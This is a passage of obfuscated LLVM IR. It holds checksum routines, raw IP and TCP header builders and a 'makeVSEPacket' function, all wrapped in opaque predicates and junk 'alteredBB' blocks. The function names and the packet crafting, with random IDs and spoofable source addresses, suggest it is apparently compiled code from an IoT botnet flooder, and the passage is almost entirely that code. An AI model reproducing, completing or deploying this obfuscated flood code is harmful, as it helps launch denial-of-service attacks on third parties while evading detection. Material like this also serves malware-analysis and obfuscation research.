  %108 = getelementptr inbounds i16, i16* %107, i32 1
  store i16* %108, i16** %3, align 8
  %109 = load i16, i16* %107, align 2
  %110 = zext i16 %109 to i64
  %111 = load i64, i64* %5, align 8
  %_ = sub i64 0, %111
  %gen = add i64 %_, %110
  %_1 = sub i64 %111, %110
  %gen2 = mul i64 %_1, %110
  %_3 = sub i64 %111, %110
  %gen4 = mul i64 %_3, %110
  %_5 = shl i64 %111, %110
  %_6 = sub i64 %111, %110
  %gen7 = mul i64 %_6, %110
  %112 = add i64 %111, %110
  store i64 %112, i64* %5, align 8
  %113 = load i32, i32* %4, align 4
  %_8 = sub i32 %113, 2
  %gen9 = mul i32 %_8, 2
  %114 = sub nsw i32 %113, 2
  store i32 %114, i32* %4, align 4
  br label %originalBB

originalBB10alteredBB:                            ; preds = %originalBB10, %37
  %115 = load i16*, i16** %3, align 8
  %116 = bitcast i16* %115 to i8*
  %117 = load i8, i8* %116, align 1
  %118 = zext i8 %117 to i64
  %119 = load i64, i64* %5, align 8
  %_11 = sub i64 0, %119
  %gen12 = add i64 %_11, %118
  %_13 = sub i64 0, %119
  %gen14 = add i64 %_13, %118
  %_15 = sub i64 0, %119
  %gen16 = add i64 %_15, %118
  %_17 = sub i64 %119, %118
  %gen18 = mul i64 %_17, %118
  %_19 = shl i64 %119, %118
  %_20 = sub i64 %119, %118
  %gen21 = mul i64 %_20, %118
  %_22 = sub i64 %119, %118
  %gen23 = mul i64 %_22, %118
  %120 = add i64 %119, %118
  store i64 %120, i64* %5, align 8
  br label %originalBB10

originalBB27alteredBB:                            ; preds = %originalBB27, %61
  %121 = load i64, i64* %5, align 8
  %_28 = shl i64 %121, 16
  %_29 = sub i64 0, %121
  %gen30 = add i64 %_29, 16
  %_31 = shl i64 %121, 16
  %_32 = sub i64 %121, 16
  %gen33 = mul i64 %_32, 16
  %122 = lshr i64 %121, 16
  %123 = icmp ne i64 %122, 0
  br label %originalBB27

originalBB37alteredBB:                            ; preds = %originalBB37, %81
  %124 = load i64, i64* %5, align 8
  %_38 = sub i64 %124, 65535
  %gen39 = mul i64 %_38, 65535
  %_40 = sub i64 %124, 65535
  %gen41 = mul i64 %_40, 65535
  %_42 = shl i64 %124, 65535
  %_43 = sub i64 0, %124
  %gen44 = add i64 %_43, 65535
  %_45 = sub i64 %124, 65535
  %gen46 = mul i64 %_45, 65535
  %_47 = sub i64 0, %124
  %gen48 = add i64 %_47, 65535
  %_49 = sub i64 0, %124
  %gen50 = add i64 %_49, 65535
  %125 = and i64 %124, 65535
  %126 = load i64, i64* %5, align 8
  %_51 = shl i64 %126, 16
  %_52 = shl i64 %126, 16
  %_53 = sub i64 %126, 16
  %gen54 = mul i64 %_53, 16
  %127 = lshr i64 %126, 16
  %_55 = sub i64 %125, %127
  %gen56 = mul i64 %_55, %127
  %_57 = sub i64 0, %125
  %gen58 = add i64 %_57, %127
  %_59 = shl i64 %125, %127
  %_60 = shl i64 %125, %127
  %128 = add i64 %125, %127
  store i64 %128, i64* %5, align 8
  br label %originalBB37
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcp_udp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %originalBBpart217, %4
  %24 = load i32, i32* @x.45
  %25 = load i32, i32* @y.46
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %23
  %32 = load i32, i32* %8, align 4
  %33 = icmp sgt i32 %32, 1
  %34 = load i32, i32* @x.45
  %35 = load i32, i32* @y.46
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %33, label %42, label %68

; <label>:42:                                     ; preds = %originalBBpart2
  %43 = load i32, i32* @x.45
  %44 = load i32, i32* @y.46
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %42
  %51 = load i16*, i16** %9, align 8
  %52 = load i16, i16* %51, align 2
  %53 = zext i16 %52 to i32
  %54 = load i32, i32* %12, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i16*, i16** %9, align 8
  %57 = getelementptr inbounds i16, i16* %56, i32 1
  store i16* %57, i16** %9, align 8
  %58 = load i32, i32* %8, align 4
  %59 = sub nsw i32 %58, 2
  store i32 %59, i32* %8, align 4
  %60 = load i32, i32* @x.45
  %61 = load i32, i32* @y.46
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart217, label %originalBB1alteredBB

originalBBpart217:                                ; preds = %originalBB1
  br label %23

; <label>:68:                                     ; preds = %originalBBpart2
  %69 = load i32, i32* %8, align 4
  %70 = icmp eq i32 %69, 1
  br i1 %70, label %71, label %78

; <label>:71:                                     ; preds = %68
  %72 = load i16*, i16** %9, align 8
  %73 = bitcast i16* %72 to i8*
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  %76 = load i32, i32* %12, align 4
  %77 = add i32 %76, %75
  store i32 %77, i32* %12, align 4
  br label %78

; <label>:78:                                     ; preds = %71, %68
  %79 = load i32, i32* %10, align 4
  %80 = lshr i32 %79, 16
  %81 = and i32 %80, 65535
  %82 = load i32, i32* %12, align 4
  %83 = add i32 %82, %81
  store i32 %83, i32* %12, align 4
  %84 = load i32, i32* %10, align 4
  %85 = and i32 %84, 65535
  %86 = load i32, i32* %12, align 4
  %87 = add i32 %86, %85
  store i32 %87, i32* %12, align 4
  %88 = load i32, i32* %11, align 4
  %89 = lshr i32 %88, 16
  %90 = and i32 %89, 65535
  %91 = load i32, i32* %12, align 4
  %92 = add i32 %91, %90
  store i32 %92, i32* %12, align 4
  %93 = load i32, i32* %11, align 4
  %94 = and i32 %93, 65535
  %95 = load i32, i32* %12, align 4
  %96 = add i32 %95, %94
  store i32 %96, i32* %12, align 4
  %97 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %98 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %97, i32 0, i32 6
  %99 = load i8, i8* %98, align 1
  %100 = zext i8 %99 to i16
  %101 = call zeroext i16 @htons(i16 zeroext %100) #13
  %102 = zext i16 %101 to i32
  %103 = load i32, i32* %12, align 4
  %104 = add i32 %103, %102
  store i32 %104, i32* %12, align 4
  %105 = load i16, i16* %7, align 2
  %106 = zext i16 %105 to i32
  %107 = load i32, i32* %12, align 4
  %108 = add i32 %107, %106
  store i32 %108, i32* %12, align 4
  br label %109

; <label>:109:                                    ; preds = %originalBBpart257, %78
  %110 = load i32, i32* @x.45
  %111 = load i32, i32* @y.46
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %109
  %118 = load i32, i32* %12, align 4
  %119 = lshr i32 %118, 16
  %120 = icmp ne i32 %119, 0
  %121 = load i32, i32* @x.45
  %122 = load i32, i32* @y.46
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart229, label %originalBB19alteredBB

originalBBpart229:                                ; preds = %originalBB19
  br i1 %120, label %129, label %151

; <label>:129:                                    ; preds = %originalBBpart229
  %130 = load i32, i32* @x.45
  %131 = load i32, i32* @y.46
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %129
  %138 = load i32, i32* %12, align 4
  %139 = and i32 %138, 65535
  %140 = load i32, i32* %12, align 4
  %141 = lshr i32 %140, 16
  %142 = add i32 %139, %141
  store i32 %142, i32* %12, align 4
  %143 = load i32, i32* @x.45
  %144 = load i32, i32* @y.46
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart257, label %originalBB31alteredBB

originalBBpart257:                                ; preds = %originalBB31
  br label %109

; <label>:151:                                    ; preds = %originalBBpart229
  %152 = load i32, i32* @x.45
  %153 = load i32, i32* @y.46
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %151
  %160 = load i32, i32* %12, align 4
  %161 = xor i32 %160, -1
  %162 = trunc i32 %161 to i16
  %163 = load i32, i32* @x.45
  %164 = load i32, i32* @y.46
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBBpart264, label %originalBB59alteredBB

originalBBpart264:                                ; preds = %originalBB59
  ret i16 %162

originalBBalteredBB:                              ; preds = %originalBB, %23
  %171 = load i32, i32* %8, align 4
  %172 = icmp sgt i32 %171, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %42
  %173 = load i16*, i16** %9, align 8
  %174 = load i16, i16* %173, align 2
  %175 = zext i16 %174 to i32
  %176 = load i32, i32* %12, align 4
  %_ = shl i32 %176, %175
  %_2 = sub i32 0, %176
  %gen = add i32 %_2, %175
  %177 = add i32 %176, %175
  store i32 %177, i32* %12, align 4
  %178 = load i16*, i16** %9, align 8
  %179 = getelementptr inbounds i16, i16* %178, i32 1
  store i16* %179, i16** %9, align 8
  %180 = load i32, i32* %8, align 4
  %_3 = sub i32 %180, 2
  %gen4 = mul i32 %_3, 2
  %_5 = sub i32 0, %180
  %gen6 = add i32 %_5, 2
  %_7 = sub i32 0, %180
  %gen8 = add i32 %_7, 2
  %_9 = sub i32 0, %180
  %gen10 = add i32 %_9, 2
  %_11 = shl i32 %180, 2
  %_12 = sub i32 0, %180
  %gen13 = add i32 %_12, 2
  %_14 = sub i32 0, %180
  %gen15 = add i32 %_14, 2
  %181 = sub nsw i32 %180, 2
  store i32 %181, i32* %8, align 4
  br label %originalBB1

originalBB19alteredBB:                            ; preds = %originalBB19, %109
  %182 = load i32, i32* %12, align 4
  %_20 = sub i32 %182, 16
  %gen21 = mul i32 %_20, 16
  %_22 = sub i32 %182, 16
  %gen23 = mul i32 %_22, 16
  %_24 = sub i32 %182, 16
  %gen25 = mul i32 %_24, 16
  %_26 = sub i32 %182, 16
  %gen27 = mul i32 %_26, 16
  %183 = lshr i32 %182, 16
  %184 = icmp ne i32 %183, 0
  br label %originalBB19

originalBB31alteredBB:                            ; preds = %originalBB31, %129
  %185 = load i32, i32* %12, align 4
  %_32 = shl i32 %185, 65535
  %_33 = sub i32 %185, 65535
  %gen34 = mul i32 %_33, 65535
  %_35 = sub i32 0, %185
  %gen36 = add i32 %_35, 65535
  %_37 = shl i32 %185, 65535
  %_38 = shl i32 %185, 65535
  %_39 = shl i32 %185, 65535
  %_40 = sub i32 0, %185
  %gen41 = add i32 %_40, 65535
  %186 = and i32 %185, 65535
  %187 = load i32, i32* %12, align 4
  %_42 = shl i32 %187, 16
  %_43 = sub i32 0, %187
  %gen44 = add i32 %_43, 16
  %_45 = sub i32 %187, 16
  %gen46 = mul i32 %_45, 16
  %_47 = shl i32 %187, 16
  %188 = lshr i32 %187, 16
  %_48 = sub i32 %186, %188
  %gen49 = mul i32 %_48, %188
  %_50 = sub i32 %186, %188
  %gen51 = mul i32 %_50, %188
  %_52 = sub i32 0, %186
  %gen53 = add i32 %_52, %188
  %_54 = sub i32 %186, %188
  %gen55 = mul i32 %_54, %188
  %189 = add i32 %186, %188
  store i32 %189, i32* %12, align 4
  br label %originalBB31

originalBB59alteredBB:                            ; preds = %originalBB59, %151
  %190 = load i32, i32* %12, align 4
  %_60 = sub i32 0, %190
  %gen61 = add i32 %_60, -1
  %_62 = shl i32 %190, -1
  %191 = xor i32 %190, -1
  %192 = trunc i32 %191 to i16
  br label %originalBB59
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @makeVSEPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = load i32, i32* @x.51
  %7 = load i32, i32* @y.52
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca %struct.iphdr*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8, align 1
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %14, align 8
  store i32 %1, i32* %15, align 4
  store i32 %2, i32* %16, align 4
  store i8 %3, i8* %17, align 1
  store i32 %4, i32* %18, align 4
  store i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i32 0, i32 0), i8** %19, align 8
  %21 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %22 = bitcast %struct.iphdr* %21 to i8*
  %23 = load i8, i8* %22, align 4
  %24 = and i8 %23, -16
  %25 = or i8 %24, 5
  store i8 %25, i8* %22, align 4
  %26 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %27 = bitcast %struct.iphdr* %26 to i8*
  %28 = load i8, i8* %27, align 4
  %29 = and i8 %28, 15
  %30 = or i8 %29, 64
  store i8 %30, i8* %27, align 4
  %31 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 1
  store i8 0, i8* %32, align 1
  %33 = load i32, i32* %18, align 4
  %34 = sext i32 %33 to i64
  %35 = add i64 20, %34
  %36 = load i32, i32* %20, align 4
  %37 = sext i32 %36 to i64
  %38 = add i64 %35, %37
  %39 = trunc i64 %38 to i16
  %40 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 2
  store i16 %39, i16* %41, align 2
  %42 = call i32 @rand_cmwc()
  %43 = trunc i32 %42 to i16
  %44 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %45 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %44, i32 0, i32 3
  store i16 %43, i16* %45, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 4
  store i16 0, i16* %47, align 2
  %48 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 5
  store i8 -1, i8* %49, align 4
  %50 = load i8, i8* %17, align 1
  %51 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 6
  store i8 %50, i8* %52, align 1
  %53 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %54 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %53, i32 0, i32 7
  store i16 0, i16* %54, align 2
  %55 = load i32, i32* %16, align 4
  %56 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %57 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %56, i32 0, i32 8
  store i32 %55, i32* %57, align 4
  %58 = load i32, i32* %15, align 4
  %59 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %60 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %59, i32 0, i32 9
  store i32 %58, i32* %60, align 4
  %61 = load i32, i32* @x.51
  %62 = load i32, i32* @y.52
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %69 = alloca %struct.iphdr*, align 8
  %70 = alloca i32, align 4
  %71 = alloca i32, align 4
  %72 = alloca i8, align 1
  %73 = alloca i32, align 4
  %74 = alloca i8*, align 8
  %75 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %69, align 8
  store i32 %1, i32* %70, align 4
  store i32 %2, i32* %71, align 4
  store i8 %3, i8* %72, align 1
  store i32 %4, i32* %73, align 4
  store i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i32 0, i32 0), i8** %74, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %69, align 8
  %77 = bitcast %struct.iphdr* %76 to i8*
  %78 = load i8, i8* %77, align 4
  %_ = sub i8 %78, -16
  %gen = mul i8 %_, -16
  %79 = and i8 %78, -16
  %_1 = sub i8 %79, 5
  %gen2 = mul i8 %_1, 5
  %_3 = shl i8 %79, 5
  %_4 = sub i8 %79, 5
  %gen5 = mul i8 %_4, 5
  %_6 = shl i8 %79, 5
  %_7 = sub i8 %79, 5
  %gen8 = mul i8 %_7, 5
  %_9 = sub i8 %79, 5
  %gen10 = mul i8 %_9, 5
  %80 = or i8 %79, 5
  store i8 %80, i8* %77, align 4
  %81 = load %struct.iphdr*, %struct.iphdr** %69, align 8
  %82 = bitcast %struct.iphdr* %81 to i8*
  %83 = load i8, i8* %82, align 4
  %_11 = shl i8 %83, 15
  %_12 = sub i8 0, %83
  %gen13 = add i8 %_12, 15
  %_14 = shl i8 %83, 15
  %_15 = shl i8 %83, 15
  %84 = and i8 %83, 15
  %_16 = sub i8 %84, 64
  %gen17 = mul i8 %_16, 64
  %85 = or i8 %84, 64
  store i8 %85, i8* %82, align 4
  %86 = load %struct.iphdr*, %struct.iphdr** %69, align 8
  %87 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %86, i32 0, i32 1
  store i8 0, i8* %87, align 1
  %88 = load i32, i32* %73, align 4
  %89 = sext i32 %88 to i64
  %_18 = sub i64 0, 20
  %gen19 = add i64 %_18, %89
  %_20 = shl i64 20, %89
  %_21 = shl i64 20, %89
  %_22 = shl i64 20, %89
  %_23 = sub i64 20, %89
  %gen24 = mul i64 %_23, %89
  %_25 = shl i64 20, %89
  %_26 = shl i64 20, %89
  %90 = add i64 20, %89
  %91 = load i32, i32* %75, align 4
  %92 = sext i32 %91 to i64
  %_27 = shl i64 %90, %92
  %93 = add i64 %90, %92
  %94 = trunc i64 %93 to i16
  %95 = load %struct.iphdr*, %struct.iphdr** %69, align 8
  %96 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %95, i32 0, i32 2
  store i16 %94, i16* %96, align 2
  %97 = call i32 @rand_cmwc()
  %98 = trunc i32 %97 to i16
  %99 = load %struct.iphdr*, %struct.iphdr** %69, align 8
  %100 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %99, i32 0, i32 3
  store i16 %98, i16* %100, align 4
  %101 = load %struct.iphdr*, %struct.iphdr** %69, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 4
  store i16 0, i16* %102, align 2
  %103 = load %struct.iphdr*, %struct.iphdr** %69, align 8
  %104 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %103, i32 0, i32 5
  store i8 -1, i8* %104, align 4
  %105 = load i8, i8* %72, align 1
  %106 = load %struct.iphdr*, %struct.iphdr** %69, align 8
  %107 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %106, i32 0, i32 6
  store i8 %105, i8* %107, align 1
  %108 = load %struct.iphdr*, %struct.iphdr** %69, align 8
  %109 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %108, i32 0, i32 7
  store i16 0, i16* %109, align 2
  %110 = load i32, i32* %71, align 4
  %111 = load %struct.iphdr*, %struct.iphdr** %69, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i32 0, i32 8
  store i32 %110, i32* %112, align 4
  %113 = load i32, i32* %70, align 4
  %114 = load %struct.iphdr*, %struct.iphdr** %69, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i32 0, i32 9
  store i32 %113, i32* %115, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %26

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* @x.53
  %9 = load i32, i32* @y.54
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* %3, align 4
  %17 = call i32 @close(i32 %16)
